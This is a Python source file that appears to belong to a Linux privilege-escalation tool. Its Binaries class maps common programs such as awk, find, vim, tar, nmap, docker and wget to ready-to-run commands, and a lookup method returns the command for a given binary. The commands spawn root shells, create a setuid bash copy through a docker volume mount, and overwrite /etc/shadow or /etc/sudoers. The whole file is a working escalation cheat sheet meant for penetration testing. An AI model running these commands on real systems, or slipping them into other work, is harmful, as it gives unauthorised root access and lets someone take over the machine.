#!/usr/bin/env python
# -*- coding: utf-8 -*-

class Binaries():
	'''
	Binaries that allow to execute commands from it. 
	If run with higher privilege (suid / cron / ...) could be used to elevate our privilege
	http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html
	https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html#abusing-sudo-rights
	http://touhidshaikh.com/blog/?p=790
	'''

	# nc, netcat, strace ? 
	def __init__(self):
		self.list = [
			('apache2', '$ apache2 -f /etc/shadow'), # Read files
			('awk', 	'$ awk \'BEGIN {system("/bin/sh")}\''),
			('bash', 	'$ /bin/bash'),
			('cp', 		'overwrite /etc/shadow or /etc/sudoers file'),
			('dash', 	'$ /bin/dash'),
			('docker', 	'$ docker run -v /home/${USER}:/h_docs ubuntu bash -c "cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;" && ~/rootshell -p'),
			('ftp', 	'$ ftp> ! ls'),
			('find', 	'$ echo "/bin/sh" > /tmp/run.sh\n$ find . -type d -exec /tmp/run.sh {} \\;'), # or find . -type d -exec sh -c id {} \;
			('git', 	'$ export PAGER=./runme.sh\n$ git -p help'),
			('less', 	'!bash'),
			('lua', 	'os.execute(\'/bin/sh\')'),
			('man', 	'!bash '), # or $ man -P /tmp/runme.sh man
			('more', 	'!bash'),
			('mount', 	'$ sudo mount -o bind /bin/bash /bin/mount\n$ sudo mount'), # could be a false positive => mount: only root can use "--options" option
			('mv', 		'overwrite /etc/shadow or /etc/sudoers file'),
			('nmap', 	'$ echo "os.execute(\'/bin/sh\')" > /tmp/script.nse\n$ nmap --script=/tmp/script.nse'), 
			('perl', 	'$ perl -e \'exec "/bin/sh";\''),
			('python', 	'$ python -c \'import os;os.system("/bin/sh")\''),
			('rbash', 	'$ /bin/rbash'),
			('ruby', 	'$ ruby -e \'exec "/bin/sh"\''),
			('sftp', 	'$ ftp> ! ls'),
			('sh', 		'$ /bin/sh'),
			('tar', 	'$ tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh'), # or tar c a.tar -I ./runme.sh a 
			('tcpdump', '$ tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh'), # or sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
			('vi', 		'$ vi -c \'!sh\''), # or :!bash or :set shell=/bin/bash:shell or :shell
			('vim', 	'$ vim -c \'!sh\''), # or :!bash or :set shell=/bin/bash:shell or :shell
			('wget', 	'$ sudo wget http://127.0.0.1/sudoers -O /etc/sudoers'), # Overwrite system file (need a web server)
			('zip', 	'$ zip z.zip * -T -TT /tmp/run.sh'),
		]

	def find_binary(self, binary):
		'''
		Found the associated command line to execute system code using the binary
		'''
		for b in self.list: 
			if b[0] == binary.lower(): 
				return b[1]
		return False